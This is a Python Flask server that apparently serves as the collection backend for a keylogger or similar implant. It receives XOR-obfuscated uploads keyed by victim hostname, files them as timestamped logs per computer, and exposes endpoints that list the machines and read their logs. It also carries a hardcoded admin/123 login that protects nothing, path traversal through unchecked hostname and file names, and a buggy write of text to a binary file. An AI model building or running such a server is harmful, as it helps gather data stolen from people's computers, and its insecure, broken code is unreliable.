import os
import datetime
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

UPLOAD_FOLDER = "uploads"
KEY = 5
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
users = {
    "admin": "123"
}


def xor_decrypt(data):
    return ''.join(chr(ord(c) ^ KEY) for c in data)


@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files or 'hostname' not in request.form:
        return jsonify({"error": "Missing file or hostname"}), 400

    file = request.files['file']
    hostname = request.form['hostname']

    computer_folder = os.path.join(UPLOAD_FOLDER, hostname)
    os.makedirs(computer_folder, exist_ok=True)

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_path = os.path.join(computer_folder, f"{timestamp}.txt")

    if os.path.exists(file_path):
        with open(file_path, "ab") as f:
            f.write(xor_decrypt(file.read().decode("utf-8")))
    else:
        file.save(file_path)

    print(jsonify({"message": "File received", "path": file_path}))

    return jsonify({"message": "File received", "path": file_path}), 200


@app.route('/computers', methods=['GET'])
def list_computers():
    computers = [d for d in os.listdir(UPLOAD_FOLDER) if os.path.isdir(os.path.join(UPLOAD_FOLDER, d))]
    return jsonify({"computers": computers})


@app.route('/computers/<computerName>/logs', methods=['GET'])
def get_computer_logs(computerName):
    computer_folder = os.path.join(UPLOAD_FOLDER, computerName)

    if not os.path.isdir(computer_folder):
        return jsonify({"error": "Computer not found"}), 404

    logs = [l for l in os.listdir(computer_folder) if os.path.isfile(os.path.join(computer_folder, l))]
    # print(logs)
    return jsonify({"computer": computerName, "logs": logs})


@app.route('/computers/<computerName>/logs/<logFile>', methods=['GET'])
def get_log_content(computerName, logFile):
    computer_folder = os.path.join(UPLOAD_FOLDER, computerName)
    log_path = os.path.join(computer_folder, logFile)

    if not os.path.exists(log_path):
        return jsonify({"error": "Log file not found"}), 404

    return send_file(log_path, mimetype="text/plain")


@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    if username in users and users[username] == password:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False})



if __name__ == '__main__':
    print('server is listening on port 5000')
    app.run(host='0.0.0.0', port=5000)
